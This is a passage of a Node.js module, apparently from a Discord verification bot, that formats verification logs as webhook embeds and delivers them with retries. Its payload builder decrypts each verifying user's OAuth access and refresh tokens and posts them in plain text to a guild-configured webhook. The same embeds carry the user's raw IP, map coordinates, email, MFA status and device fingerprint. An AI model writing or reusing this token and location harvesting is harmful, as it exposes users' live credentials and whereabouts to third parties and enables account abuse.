"use strict";

const crypto = require("node:crypto");
const mongoose = require("mongoose");
const GuildConfig = require("../../models/GuildConfig");
const VerifyLog = require("../../models/VerifyLog");
const OAuthUser = require("../../models/OAuthUser");
const { verificationWebhookRepository } = require("../../../../database/sqlite/repositories/core/VerificationWebhookRepository");
const { validateWebhookUrl, sendWebhookEvent } = require("../../../core/webhooks");
const { decryptToken, decryptIP } = require("../../utils/crypto");

const alertDedupMap = new Map();

function safeSlice(str, start, end) {
    if (!str) return "";
    let sliceEnd = end;
    if (sliceEnd < str.length) {
        const cp = str.codePointAt(sliceEnd - 1);
        if (cp !== undefined && (cp > 0xFFFF || (cp >= 0xD800 && cp <= 0xDBFF))) {
            sliceEnd -= 1;
        }
    }
    return str.slice(start, sliceEnd);
}

function sendThrottledAlert({ key, severity = "ERROR", code, title, description, guildId = null }) {
    try {
        const now = Date.now();
        const lastSent = alertDedupMap.get(key) || 0;
        if (now - lastSent < 60000) return;
        alertDedupMap.set(key, now);

        if (alertDedupMap.size > 200) {
            for (const [k, ts] of alertDedupMap.entries()) {
                if (now - ts > 300000) alertDedupMap.delete(k);
            }
        }

        if (typeof sendWebhookEvent === "function") {
            sendWebhookEvent({
                target: "ALERT",
                severity,
                category: "VERIFICATION",
                code,
                state: "OPEN",
                guildId,
                title,
                description
            }).catch(() => {});
        }
    } catch {
        // Never allow alerting failure to crash worker or caller
    }
}

const MAX_EMBED_CHARS = 5800;
const MAX_FIELD_VALUE_CHARS = 1000;
const MAX_FIELD_NAME_CHARS = 240;
const MAX_EMBEDS_PER_MESSAGE = 10;
const BATCH_SIZE = 5;
const RATE_LIMIT_DELAY_MS = 1200;

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, Math.max(0, Number(ms) || 0)));
}

function truncate(str, max = 1024) {
    const s = String(str || "");
    return s.length > max ? s.slice(0, max - 3) + "..." : s;
}

function formatDate(timestamp) {
    if (!timestamp) return "ไม่มีข้อมูล";
    try {
        const d = new Date(timestamp);
        return d.toLocaleString("th-TH", { timeZone: "Asia/Bangkok" });
    } catch {
        return String(timestamp);
    }
}

function flattenOversizedLines(lines, maxChars) {
    const normalizedLines = [];
    for (const rawLine of lines) {
        const s = String(rawLine || "");
        if (s.length <= maxChars) {
            normalizedLines.push(s);
        } else {
            let offset = 0;
            while (offset < s.length) {
                const chunk = safeSlice(s, offset, offset + maxChars);
                normalizedLines.push(chunk);
                offset += chunk.length || maxChars;
            }
        }
    }
    return normalizedLines;
}

/**
 * Splits lines into multiple embed fields to avoid truncation (P1-8).
 */
function chunkLinesToFields(title, lines, maxChars = MAX_FIELD_VALUE_CHARS) {
    const safeTitle = truncate(title, MAX_FIELD_NAME_CHARS);
    if (!Array.isArray(lines) || !lines.length) {
        return [{ name: safeTitle, value: "ไม่มี", inline: false }];
    }

    const normalizedLines = flattenOversizedLines(lines, maxChars);

    const fields = [];
    let currentLines = [];
    let currentLen = 0;

    for (const line of normalizedLines) {
        const lineLen = line.length + 1;
        if (currentLen + lineLen > maxChars && currentLines.length > 0) {
            const partNum = fields.length + 1;
            const partSuffix = partNum > 1 ? ` (ส่วนที่ ${partNum})` : "";
            fields.push({
                name: truncate(`${safeTitle}${partSuffix}`, 250),
                value: currentLines.join("\n"),
                inline: false
            });
            currentLines = [line];
            currentLen = line.length;
        } else {
            currentLines.push(line);
            currentLen += lineLen;
        }
    }
    if (currentLines.length > 0) {
        const partNum = fields.length + 1;
        const partSuffix = partNum > 1 ? ` (ส่วนที่ ${partNum})` : "";
        fields.push({
            name: truncate(`${safeTitle}${partSuffix}`, 250),
            value: currentLines.join("\n"),
            inline: false
        });
    }
    return fields;
}

/**
 * Splits a long string into multiple embed fields to avoid truncation (P1-8).
 */
function chunkStringToFields(title, str, maxChars = MAX_FIELD_VALUE_CHARS) {
    const safeTitle = truncate(title, MAX_FIELD_NAME_CHARS);
    const s = String(str || "");
    if (!s) return [{ name: safeTitle, value: "ไม่มี", inline: false }];
    if (s.length <= maxChars) {
        return [{ name: safeTitle, value: s, inline: false }];
    }
    const fields = [];
    let remaining = s;
    let part = 1;
    while (remaining.length > 0) {
        const chunk = safeSlice(remaining, 0, maxChars);
        remaining = remaining.slice(chunk.length || maxChars);
        const partSuffix = part > 1 ? ` (ส่วนที่ ${part})` : "";
        fields.push({
            name: truncate(`${safeTitle}${partSuffix}`, 250),
            value: chunk,
            inline: false
        });
        part++;
    }
    return fields;
}

let appConfig = null;
try {
    appConfig = require("../../../config.json");
} catch {
    appConfig = null;
}

const EMOJIS = Object.freeze({
    DISCORD: appConfig?.emojis?.server_icon || "<:Discord_pmt:1553835220912840814>",
    CHECK: appConfig?.emojis?.success || "<a:CHECK_pmt:1553832954051174426>",
    CROSS: appConfig?.emojis?.error || "<a:CROSS_pmt:1553833049135906816>",
    ROLES: appConfig?.emojis?.members || "<:kroles_pmt:1553835237333672006>",
    SHIELD: appConfig?.emojis?.shield || "<:check_pmt:1553835205553553599>",
    LOCK: appConfig?.emojis?.lock || "<:vak_pmt:1553835198066729121>",
    BELL: appConfig?.emojis?.bell || ":bell_pmt:",
    ANDROID: appConfig?.emojis?.android || ":Android_pmt:",
    CODE: appConfig?.emojis?.code || ":Code_pmt:",
    ALERT_BOUNCE: appConfig?.emojis?.alert_bounce || ":j357_pmt:"
});

function formatPlatform(platform) {
    if (!platform || platform === "unknown" || platform === "Unknown") return "ไม่ระบุ";
    const p = String(platform).trim();
    if (p === "Win32" || p === "Win64") return "Win32/Windows";
    if (p === "MacIntel" || p.includes("Mac")) return "MacIntel/MacBook, iMac";
    if (p === "iPhone") return "iPhone";
    if (p === "iPad") return "iPad";
    if (/arm|aarch/i.test(p) && /linux/i.test(p)) return `${p}/Android`;
    if (/linux/i.test(p)) return `${p}/Linux`;
    return p;
}

function formatCoordinates(lat, lon) {
    const latNum = Number(lat);
    const lonNum = Number(lon);
    if (lat != null && lon != null && !Number.isNaN(latNum) && !Number.isNaN(lonNum)) {
        return `[${lat}, ${lon}](https://www.google.com/maps?q=${lat},${lon})`;
    }
    return "ไม่มีข้อมูล";
}

function formatNitro(premiumType) {
    const pt = Number(premiumType);
    if (pt === 1) return "มี (Nitro Classic)";
    if (pt === 2) return "มี (Discord Nitro)";
    if (pt === 3) return "มี (Nitro Basic)";
    return "ไม่มี";
}

function formatExpires(expiresAt) {
    if (!expiresAt) return "7 วัน";
    try {
        const ms = new Date(expiresAt).getTime() - Date.now();
        const days = Math.max(1, Math.round(ms / (24 * 60 * 60 * 1000)));
        return `${days} วัน (หมดอายุ ${formatDate(expiresAt)})`;
    } catch {
        return formatDate(expiresAt);
    }
}

function formatTouchscreen(touchPoints) {
    if (touchPoints != null && !Number.isNaN(Number(touchPoints))) {
        const tp = Number(touchPoints);
        if (tp > 0) return `รองรับ ${tp} จุด`;
        if (tp === 0) return "ไม่รองรับ (PC/โน้ตบุ๊ก)";
    }
    return "ไม่ระบุ";
}

function formatMobileOrBroadband(ipInfo = {}) {
    if (ipInfo.mobile) return "เน็ตมือถือ (Cellular 4G/5G)";
    return "เน็ตบ้านสายไฟเบอร์/บรอดแบนด์";
}

function formatDeviceFingerprint(device, trackingSnapshot = {}) {
    const count = Number(trackingSnapshot.uniqueUsers || 1);
    if (count > 1) {
        return `${count} บัญชี (ตรวจพบบัญชีซ้ำในเครื่องนี้ ⚠️)`;
    }
    return "1 บัญชี (เครื่องใหม่ ไม่พบไอดีโคลน ✅)";
}

function formatSharedIp(trackingSnapshot = {}) {
    const count = Number(trackingSnapshot.uniqueUsers || 1);
    if (count > 1) {
        return `${count} บัญชี (ตรวจพบหลายไอดีใช้ IP ร่วมกัน ⚠️)`;
    }
    return "1 บัญชี (ปกติ ✅)";
}

function formatSpoofedHeaders(device = {}) {
    if (device.userAgentSuspected || (Array.isArray(device.userAgentFlags) && device.userAgentFlags.length > 0)) {
        return `ตรวจพบความผิดปกติ (${device.userAgentFlags.join(", ")}) ⚠️`;
    }
    return "ไม่พบ (ปกติ ✅)";
}

function buildDiscordInfoLines(profile, guildSummary) {
    const globalName = profile.globalName || profile.username || "ไม่มี";
    const username = profile.username || "ไม่มี";
    const userId = String(profile.id || "ไม่มี");
    const avatarLink = profile.avatarUrl ? `[คลิกเพื่อดูรูปโปรไฟล์](${profile.avatarUrl})` : "ไม่มี";
    const bannerLink = profile.bannerUrl ? `[คลิกเพื่อดูแบนเนอร์](${profile.bannerUrl})` : "ไม่มี";
    const discriminator = profile.discriminator && profile.discriminator !== "0" ? `#${profile.discriminator}` : "#0";
    const email = profile.email || "ไม่มีข้อมูล";
    const emailVerifiedText = profile.emailVerified ? `ยืนยันแล้ว${EMOJIS.CHECK}` : `ยังไม่ยืนยัน${EMOJIS.CROSS}`;
    const appLocale = profile.locale || "th";
    const mfaText = profile.mfaEnabled ? `เปิดใช้งาน${EMOJIS.CHECK}` : `ปิด${EMOJIS.CROSS}`;
    const createdDate = profile.accountCreatedAt ? `${formatDate(profile.accountCreatedAt)} (${profile.accountAgeDays || 0} วัน)` : "ไม่ระบุ";
    const badges = Array.isArray(profile.badgeFlags) && profile.badgeFlags.length ? profile.badgeFlags.join(", ") : "ไม่มี";
    const nitroText = formatNitro(profile.premiumType);
    const totalGuilds = guildSummary ? (guildSummary.totalGuilds ?? guildSummary.totalCount ?? "ไม่ระบุ") : "ไม่ระบุ";
    const ownedGuilds = guildSummary ? (guildSummary.ownerGuildsCount ?? guildSummary.ownedCount ?? 0) : 0;
    const adminGuilds = guildSummary ? (guildSummary.adminGuildsCount ?? guildSummary.adminCount ?? 0) : 0;

    return [
        `  • Global Name : ${globalName}`,
        `  • Username : ${username}`,
        `  • User ID : ${userId}`,
        `  • Avatar URL : ${avatarLink}`,
        `  • Banner URL : ${bannerLink}`,
        `  • Discriminator : ${discriminator}`,
        `  • Email : ${email}`,
        `  • Email Verified : ${emailVerifiedText}`,
        `  • ภาษาของแอป Discord : ${appLocale}`,
        `  • MFA (2FA) : ${mfaText}`,
        `  • วันสร้างบัญชี : ${createdDate}`,
        `  • เหรียญตรา : ${badges}`,
        `  • มี Nitro ไหม : ${nitroText}`,
        `  • เซิร์ฟเวอร์ที่เข้าร่วมทั้งหมด : ${totalGuilds} เซิร์ฟเวอร์`,
        `  • เซิร์ฟเวอร์ที่เป็นเจ้าของ : ${ownedGuilds} เซิร์ฟเวอร์`,
        `  • มียศ เเอดมิน กี่เซิฟเวอร์ : ${adminGuilds} เซิร์ฟเวอร์`
    ];
}

function buildIpLocationLines(ipInfo, rawIp, networkTypes) {
    const coordsStr = formatCoordinates(ipInfo.lat, ipInfo.lon);
    const accuracyRadius = ipInfo.accuracyRadius || 5;
    const city = ipInfo.city || "ไม่ระบุ";
    const region = ipInfo.region || ipInfo.regionName || "ไม่ระบุ";
    const country = ipInfo.country || "ไม่ระบุ";
    const locationStr = `เมือง-${city}, จังหวัด/รัฐ-${region}, ประเทศ-${country}`;
    const zip = ipInfo.zip || "ไม่ระบุ";
    const timezone = ipInfo.timezone || "Asia/Bangkok";
    const isp = ipInfo.isp || "ไม่ทราบ ISP";
    const org = ipInfo.org || ipInfo.as || "ไม่ระบุ";
    const reverseDns = ipInfo.reverse || ipInfo.hostname || "ไม่ระบุ";
    const networkStatusDetail = networkTypes.length ? networkTypes.join(", ") : "อินเทอร์เน็ตบ้านปกติ";
    const mobileOrBroadband = formatMobileOrBroadband(ipInfo);

    return [
        `  • IP Address : ${rawIp}`,
        `  • พิกัด ละติจูด/ลองจิจูด : ${coordsStr}`,
        `  • รัศมีความแม่นยำพิกัด : ± ${accuracyRadius} กม.`,
        `  • ตำแหน่ง : ${locationStr}`,
        `  • รหัสไปรษณีย์ : ${zip}`,
        `  • Timezone : ${timezone}`,
        `  • ผู้ให้บริการอินเทอร์เน็ต : ${isp}`,
        `  • องค์กรโครงข่าย : ${org}`,
        `  • ชื่อโหนดโฮสต์ของเครือข่าย : ${reverseDns}`,
        `  • สถานะเครือข่ายที่ตรวจพบ : ${networkStatusDetail}`,
        `  • เน็ตมือถือหรือเน็ตบ้าน : ${mobileOrBroadband}`
    ];
}

function buildDeviceLines(device) {
    const deviceType = device?.deviceType || "Desktop";
    const platformFormatted = formatPlatform(device?.platform);
    const os = device?.os || "ไม่ระบุ";
    const screen = device?.screenSize || "ไม่ระบุ";
    const browser = device?.browser || "ไม่ระบุ";
    const browserLanguages = Array.isArray(device?.languages) && device.languages.length ? device.languages.join(", ") : (device?.language || "th-TH, en-US");
    const touchscreen = formatTouchscreen(device?.touchPoints);
    const userAgentStr = device?.userAgent ? `\`${device.userAgent}\`` : "`ไม่มีข้อมูล`";

    return [
        `  • ประเภทอุปกรณ์ : ${deviceType}`,
        `  • สถาปัตยกรรมระบบ : ${platformFormatted}`,
        `  • ระบบปฏิบัติการ : ${os}`,
        `  • หน้าจอ : ${screen}`,
        `  • เบราว์เซอร์ : ${browser}`,
        `  • ภาษาของเบราว์เซอร์ : ${browserLanguages}`,
        `  • หน้าจอสัมผัส : ${touchscreen}`,
        `  • User-Agent :`,
        `  ${userAgentStr}`
    ];
}

function buildTokenLines(tokens, findings, accessToken, refreshToken) {
    const scopeStr = tokens.scope || "identify email connections guilds guilds.members.read guilds.join";
    const expiresStr = formatExpires(tokens.expiresAt);
    const securityFindingsStr = Array.isArray(findings) && findings.length ? findings.join(", ") : "ไม่พบความเสี่ยง";

    return [
        `  • Scope : ${scopeStr}`,
        `  • หมดอายุ : ${expiresStr}`,
        `  • รายงานความเสี่ยง : ${securityFindingsStr}`,
        `  • Access Token :`,
        `  \`${accessToken}\``,
        `  • Refresh Token :`,
        `  \`${refreshToken}\``
    ];
}

function buildSecurityTrackingLines(device, trackingSnapshot, findings) {
    const deviceFingerprint = formatDeviceFingerprint(device, trackingSnapshot);
    const sharedIp = formatSharedIp(trackingSnapshot);
    let firstSeen = "ไม่มีข้อมูล";
    if (trackingSnapshot?.firstSeenAt) {
        firstSeen = formatDate(trackingSnapshot.firstSeenAt);
    } else if (trackingSnapshot) {
        firstSeen = "เพิ่งพบครั้งแรกในการยืนยันนี้";
    }
    const spoofHeader = formatSpoofedHeaders(device || {});
    const findingsSummary = Array.isArray(findings) && findings.length ? findings.join(", ") : "ไม่พบความเสี่ยง";

    return [
        `  • ตรวจพบบัญชีในเครื่องนี้ : ${deviceFingerprint}`,
        `  • บัญชีที่เคยใช้ IP นี้ : ${sharedIp}`,
        `  • วันที่เข้าร่วมเซิร์ฟเวอร์ครั้งแรกจาก IP นี้ : ${firstSeen}`,
        `  • การดัดแปลง Header เครือข่าย : ${spoofHeader}`,
        `  • ข้อสังเกตความปลอดภัย : ${findingsSummary}`
    ];
}

function buildEmbedDescription({ guildName, guildId, profile, result, roleId, roleName, ipInfo }) {
    const serverName = guildName || "Phomueangtai Community";
    const serverIdStr = guildId ? `(${guildId})` : "";
    const userTag = profile.id ? `<@${profile.id}>` : (profile.username || "ไม่ระบุ");
    const resultEmoji = result === "success" ? EMOJIS.CHECK : EMOJIS.CROSS;
    const resultLabel = result === "success" ? `สำเร็จ ${resultEmoji}` : `ถูกปฏิเสธ ${resultEmoji}`;
    let roleMention = "ไม่มี";
    if (roleId) {
        const roleSuffix = roleName ? ` (${roleName})` : "";
        roleMention = `<@&${roleId}>${roleSuffix}`;
    } else if (roleName) {
        roleMention = `@${roleName}`;
    }

    const networkTypes = [];
    if (ipInfo.isVPN) networkTypes.push("VPN");
    if (ipInfo.isProxy) networkTypes.push("Proxy");
    if (ipInfo.isTOR) networkTypes.push("TOR");
    if (ipInfo.hosting || ipInfo.isHosting) networkTypes.push("Hosting/Datacenter");
    const networkStatusBrief = networkTypes.length ? `ตรวจพบ ${networkTypes.join(" / ")}` : "อินเทอร์เน็ตบ้าน/ปกติ";

    const description = [
        `ข้อมูลจากเซิร์ฟเวอร์ : ${serverName}`,
        `เซิร์ฟเวอร์ id : ${serverIdStr}`,
        `User : ${userTag}`,
        ``,
        `  • ผลการยืนยัน : ${resultLabel}`,
        `  • ยศที่ได้รับ : ${roleMention}`,
        `  • เครือข่ายที่อาจจะใช้ยืนยัน : ${networkStatusBrief}`
    ].join("\n");

    return { description, networkTypes };
}

/**
 * Builds the canonical single-embed payload for a verification event.
 * Preserves all fields with zero silent truncation (OI-05 / P1-8).
 */
function buildWebhookPayload({
    eventId = null,
    guildId = null,
    guildName = null,
    profile = {},
    connections = [],
    guildSummary = null,
    ipInfo = {},
    device = null,
    tokens = {},
    trackingSnapshot = {},
    roleId = null,
    roleName = null,
    findings = [],
    result = "success",
    verifiedAt = Date.now()
}) {
    const rawIp = ipInfo.encryptedRawIp
        ? (decryptIP(ipInfo.encryptedRawIp) || ipInfo.ipHash || "ไม่พบ IP")
        : (ipInfo.rawIp || ipInfo.ip || ipInfo.ipHash || "ไม่มีข้อมูล");
    const accessToken = tokens.accessToken || (tokens.encryptedAccessToken ? decryptToken(tokens.encryptedAccessToken) : null) || "ไม่มีข้อมูล";
    const refreshToken = tokens.refreshToken || (tokens.encryptedRefreshToken ? decryptToken(tokens.encryptedRefreshToken) : null) || "ไม่มีข้อมูล";

    const { description, networkTypes } = buildEmbedDescription({
        guildName,
        guildId,
        profile,
        result,
        roleId,
        roleName,
        ipInfo
    });

    const discordInfoLines = buildDiscordInfoLines(profile, guildSummary);
    const ipLocationLines = buildIpLocationLines(ipInfo, rawIp, networkTypes);
    const deviceLines = buildDeviceLines(device);
    const connList = Array.isArray(connections) && connections.length > 0
        ? connections.map(c => typeof c === "string" ? c : (c.type || c.name || "Unknown")).join(", ")
        : "ไม่มีการเชื่อมต่อบัญชีภายนอก";
    const connectionLines = [`  •  ${connList}`];
    const tokenLines = buildTokenLines(tokens, findings, accessToken, refreshToken);
    const securityLines = buildSecurityTrackingLines(device, trackingSnapshot, findings);

    const fields = [
        ...chunkLinesToFields(`${EMOJIS.ROLES} ข้อมูลบัญชี Discord`, discordInfoLines),
        ...chunkLinesToFields(`${EMOJIS.SHIELD} ที่อยู่ IP & ตำแหน่ง`, ipLocationLines),
        ...chunkLinesToFields(`${EMOJIS.ANDROID} อุปกรณ์ & เบราว์เซอร์`, deviceLines),
        ...chunkLinesToFields(`${EMOJIS.LOCK} บัญชีนอกที่เชื่อมต่อ`, connectionLines),
        ...chunkLinesToFields(`${EMOJIS.CODE} สิทธิ์และการเข้าถึง`, tokenLines),
        ...chunkLinesToFields(`${EMOJIS.ALERT_BOUNCE} ข้อมูลระบบตรวจจับความปลอดภัย`, securityLines)
    ];

    let userAvatarUrl = profile.avatarUrl;
    if (!userAvatarUrl && profile.id) {
        try {
            const discIndex = Number((BigInt(profile.id) >> 22n) % 6n);
            userAvatarUrl = `https://cdn.discordapp.com/embed/avatars/${discIndex}.png`;
        } catch {
            userAvatarUrl = "https://cdn.discordapp.com/embed/avatars/0.png";
        }
    }

    let embedColor = 0xF39C12;
    if (result === "success") {
        embedColor = 0x2ECC71;
    } else if (result === "blocked") {
        embedColor = 0xE74C3C;
    }

    const embed = {
        title: `${EMOJIS.BELL} Log Verify ผู้ใช้งาน`,
        description,
        color: embedColor,
        thumbnail: userAvatarUrl ? { url: userAvatarUrl } : undefined,
        fields,
        timestamp: new Date(verifiedAt).toISOString()
    };

    return [embed];
}

/**
 * Splits embeds having more than 25 fields or total chars > MAX_EMBED_CHARS into sequential embeds (Discord limit safety).
 */
function splitEmbedFields(embed) {
    const fields = Array.isArray(embed.fields) ? embed.fields : [];
    if (!fields.length) {
        return [embed];
    }
    const result = [];
    let currentSlice = [];
    let currentFieldChars = 0;
    const baseChars = (embed.title?.length || 0) + (embed.description?.length || 0) + (embed.footer?.text?.length || 0);

    for (const f of fields) {
        const fChars = (f.name?.length || 0) + (f.value?.length || 0);
        // Split if fields count reaches 25 OR total embed characters would exceed MAX_EMBED_CHARS
        if (currentSlice.length >= 25 || (currentSlice.length > 0 && baseChars + currentFieldChars + fChars > MAX_EMBED_CHARS)) {
            result.push({
                ...embed,
                title: result.length === 0 ? embed.title : truncate(`${embed.title} (ส่วนต่อ ${result.length + 1})`, 250),
                fields: currentSlice
            });
            currentSlice = [f];
            currentFieldChars = fChars;
        } else {
            currentSlice.push(f);
            currentFieldChars += fChars;
        }
    }

    if (currentSlice.length > 0) {
        result.push({
            ...embed,
            title: result.length === 0 ? embed.title : truncate(`${embed.title} (ส่วนต่อ ${result.length + 1})`, 250),
            fields: currentSlice
        });
    }

    return result;
}

/**
 * Calculates character count of an embed for Discord limit budgeting.
 */
function embedCharCount(embed) {
    let count = (embed.title?.length || 0) + (embed.description?.length || 0) + (embed.footer?.text?.length || 0);
    if (Array.isArray(embed.fields)) {
        for (const f of embed.fields) {
            count += (f.name?.length || 0) + (f.value?.length || 0);
        }
    }
    return count;
}

/**
 * Auto-splits embeds into sequential message batches if >5,800 chars or >10 embeds without dropping data.
 */
function fitEmbedsIntoMessages(embeds = []) {
    const messages = [];
    let currentBatch = [];
    let currentChars = 0;

    for (const embed of embeds) {
        const count = embedCharCount(embed);
        if (currentBatch.length > 0 && (currentBatch.length >= MAX_EMBEDS_PER_MESSAGE || currentChars + count > MAX_EMBED_CHARS)) {
            messages.push({ embeds: currentBatch });
            currentBatch = [embed];
            currentChars = count;
        } else {
            currentBatch.push(embed);
            currentChars += count;
        }
    }
    if (currentBatch.length > 0) {
        messages.push({ embeds: currentBatch });
    }
    return messages;
}

const WEBHOOK_FETCH_TIMEOUT_MS = 15000;
const urlBackoffUntil = new Map();

async function _parseRetryAfterSeconds(res) {
    const rawHeader = res.headers.get("retry-after");
    let retryAfter = Number(rawHeader);
    if (!retryAfter || Number.isNaN(retryAfter)) {
        try {
            const errJson = await res.json().catch(() => null);
            if (errJson && typeof errJson.retry_after === "number") {
                retryAfter = errJson.retry_after;
            }
        } catch (_err) {
            // Ignore json parsing error on 429 error body
        }
    }
    return Math.max(0.5, Math.min(60, Number(retryAfter) || 2));
}

async function _handleWebhook429(webhookUrl, body, res, attempt) {
    const safeSeconds = await _parseRetryAfterSeconds(res);
    const backoffMs = Math.round(safeSeconds * 1000) + 500;
    urlBackoffUntil.set(webhookUrl, Date.now() + backoffMs);
    console.warn(`[VerificationWebhook] Rate limited (429) for ${webhookUrl}. Backing off for ${safeSeconds}s...`);
    await sleep(backoffMs);
    if (attempt < 5) {
        return postWebhookMessage(webhookUrl, body, attempt + 1);
    }
    throw new Error(`rate_limited_retry_exhausted:${safeSeconds}`);
}

/**
 * Sends a single webhook message with automatic 429 retry backoff and fetch timeout.
 */
async function postWebhookMessage(webhookUrl, body, attempt = 1) {
    const now = Date.now();
    const backoffUntil = urlBackoffUntil.get(webhookUrl);
    if (backoffUntil && backoffUntil > now) {
        const waitMs = Math.min(60000, backoffUntil - now);
        await sleep(waitMs);
    }

    const controller = new AbortController();
    const timeoutId = setTimeout(() => {
        controller.abort(new Error("webhook_request_timeout"));
    }, WEBHOOK_FETCH_TIMEOUT_MS);

    let res;
    try {
        res = await fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                ...body,
                allowed_mentions: { parse: [] }
            }),
            signal: controller.signal
        });
    } catch (fetchErr) {
        if (fetchErr.name === "AbortError" || fetchErr.message === "webhook_request_timeout") {
            const timeoutError = new Error(`webhook_request_timeout:${WEBHOOK_FETCH_TIMEOUT_MS}ms`);
            timeoutError.code = "webhook_request_timeout";
            throw timeoutError;
        }
        throw fetchErr;
    } finally {
        clearTimeout(timeoutId);
    }

    if (res.status === 429) {
        return _handleWebhook429(webhookUrl, body, res, attempt);
    }

    if (!res.ok) {
        const errorText = await res.text().catch(() => "");
        const httpError = new Error(`webhook_http_${res.status}:${errorText.slice(0, 100)}`);
        httpError.status = res.status;
        httpError.code = `webhook_http_${res.status}`;
        throw httpError;
    }

    urlBackoffUntil.delete(webhookUrl);
    return true;
}

/**
 * Determines whether a delivery error is permanent (non-retryable) such as HTTP 400, 401, 403, 404.
 */
function isPermanentWebhookError(err) {
    if (!err) return false;
    let status = Number(err.status);
    if (!status) {
        const match = /webhook_http_(\d{3})/.exec(String(err.message || ""));
        status = match ? Number(match[1]) : null;
    }
    if (status && [400, 401, 403, 404, 405, 410].includes(status)) {
        return true;
    }
    if (err.code === "destination_changed_during_delivery" || err.message === "destination_changed_during_delivery") {
        return true;
    }
    return false;
}

/**
 * Delivers full verification event embeds to a webhook URL.
 * Supports resumption from startPart to prevent re-sending already acknowledged parts on retry.
 */
async function deliverWebhookEvent(webhookUrl, embeds = [], { startPart = 0, onPartSent = null, checkDestinationValid = null } = {}) {
    const splitEmbeds = [];
    for (const emb of embeds) {
        splitEmbeds.push(...splitEmbedFields(emb));
    }
    const messages = fitEmbedsIntoMessages(splitEmbeds);
    const startIndex = Math.max(0, Math.min(Number(startPart) || 0, messages.length));

    async function sendPart(index) {
        if (index >= messages.length) return;

        if (typeof checkDestinationValid === "function") {
            const isValid = await checkDestinationValid();
            if (!isValid) {
                const destErr = new Error("destination_changed_during_delivery");
                destErr.code = "destination_changed_during_delivery";
                throw destErr;
            }
        }

        const msg = messages[index];
        await postWebhookMessage(webhookUrl, msg);
        if (typeof onPartSent === "function") {
            await onPartSent(index + 1, messages.length);
        }
        if (messages.length > 1 && index < messages.length - 1) {
            await sleep(RATE_LIMIT_DELAY_MS);
        }

        await sendPart(index + 1);
    }

    await sendPart(startIndex);
    return true;
}

/**
 * Checks whether a verification log or event is eligible for webhook delivery.
 * Must be successful AND have concrete evidence of role assignment (P0-1, P1-1).
 */
function isEligibleVerifyLog(log) {
    if (!log || typeof log !== "object") return false;
    if (log.result !== "success") return false;
    const r = log.roleAssignResult;
    if (!r || typeof r !== "object") return false;
    return Boolean(
        r.ok === true ||
        r.alreadyHadRole === true ||
        r.joinedWithRole === true ||
        r.status === "success"
    );
}

class VerificationWebhookManager {
    constructor(repo = verificationWebhookRepository) {
        this.repo = repo;
        this.activeWorkers = new Map(); // guildId -> worker promise
        this.retryTimers = new Map(); // guildId -> setTimeout timer
        this.pendingWakeups = new Set(); // guildId set for lost-wakeup prevention
        this.isRecovering = false;
        this.startupRecoveryCompleted = false;

        // Startup recovery is now explicitly invoked by verificationLifecycle.startVerificationRuntime()
        // after MongoDB and SQLite connections are fully open and ready (P1-2).
    }

    /**
     * Complete startup recovery (P1-6, P1-7):
     * 1. Recovers stuck SENDING deliveries from crashes/restarts
     * 2. Recovers active backfill jobs (or cancels orphaned jobs)
     * 3. Wakes workers for all guilds with PENDING or ready RETRY deliveries
     * 4. Schedules timers for future RETRY deliveries
     */
    async _recoverActiveJob(job) {
        try {
            const config = await GuildConfig.findOne().where("guildId").equals(job.guild_id).lean();
            const webhookConfig = config?.verification?.webhookLog;
            if (webhookConfig?.enabled && webhookConfig?.mode === "backfill_live" && webhookConfig?.url) {
                const now = Date.now();
                const leaseExpiresAt = Number(job.lease_expires_at) || 0;
                if (leaseExpiresAt <= now) {
                    if (typeof this.repo.resetJobLease === "function") {
                        this.repo.resetJobLease(job.job_id);
                    }
                    this.triggerWorker(job.guild_id, job.job_id);
                } else {
                    const waitMs = Math.max(1000, leaseExpiresAt - now + 500);
                    setTimeout(() => {
                        const currentJob = this.repo.getJobById(job.job_id);
                        if (currentJob?.status === "RUNNING") {
                            this.triggerWorker(job.guild_id, job.job_id);
                        }
                    }, waitMs).unref?.();
                }
            } else if (typeof this.repo.cancelJob === "function") {
                this.repo.cancelJob(job.job_id, "orphan_job_recovered_on_startup");
            }
        } catch (jobErr) {
            console.error(`[VerificationWebhook] Error recovering active job ${job.job_id}:`, jobErr);
            sendThrottledAlert({
                key: `job_recovery_fail_${job.guild_id}_${job.job_id}`,
                severity: "ERROR",
                code: "verification.webhook_job_recovery_failed",
                title: "JOB RECOVERY FAILED",
                description: `การกู้คืนงานประมวลผลย้อนหลังล้มเหลว (jobId=${job.job_id}, guildId=${job.guild_id}): ${jobErr?.message || jobErr}`,
                guildId: job.guild_id
            });
            if (typeof this.repo.resetJobLease === "function") {
                this.repo.resetJobLease(job.job_id);
            }
            this.triggerWorker(job.guild_id, job.job_id);
        }
    }

    /**
     * Performs cold-start recovery for webhook deliveries:
     * 1. Recovers stuck SENDING deliveries from ungraceful shutdown
     * 2. Recovers active backfill jobs
     * 3. Wakes workers for all guilds with PENDING or ready RETRY deliveries
     * 4. Schedules timers for future RETRY deliveries
     */
    async performStartupRecovery() {
        if (this.isRecovering) return false;
        this.isRecovering = true;
        try {
            // Guard: ensure SQLite database connection is initialized and open
            let sqliteReady = false;
            try {
                const probe = this.repo.db.prepare("SELECT 1 as ok").get();
                sqliteReady = probe?.ok === 1;
            } catch {
                sqliteReady = false;
            }
            if (!sqliteReady) {
                this.isRecovering = false;
                return false;
            }

            // 1. Recover stuck SENDING deliveries from node crashes immediately (maxAgeMs: 0)
            const recovery = this.repo.recoverStuckSendingDeliveries(0);
            const stuckGuildIds = Array.isArray(recovery?.guildIds) ? recovery.guildIds : [];

            // 2. Recover active backfill jobs (requires MongoDB)
            if (mongoose.connection?.readyState === 1 && typeof this.repo.getAllActiveJobs === "function") {
                const activeJobs = this.repo.getAllActiveJobs();
                await Promise.all(activeJobs.map(job => this._recoverActiveJob(job)));
            }

            // 3. Wake up all guilds with PENDING or ready RETRY deliveries
            const pendingGuildIds = typeof this.repo.getPendingOrRetryGuildIds === "function"
                ? this.repo.getPendingOrRetryGuildIds()
                : [];
            const allReadyGuildIds = new Set([...stuckGuildIds, ...pendingGuildIds]);
            for (const gId of allReadyGuildIds) {
                this.triggerWorker(gId);
            }

            // 4. Schedule retry timers for guilds with future RETRY deliveries
            const retryGuildIds = typeof this.repo.getAllRetryGuildIds === "function"
                ? this.repo.getAllRetryGuildIds()
                : [];
            for (const gId of retryGuildIds) {
                this.scheduleNextRetry(gId);
            }

            this.startupRecoveryCompleted = true;
            return true;
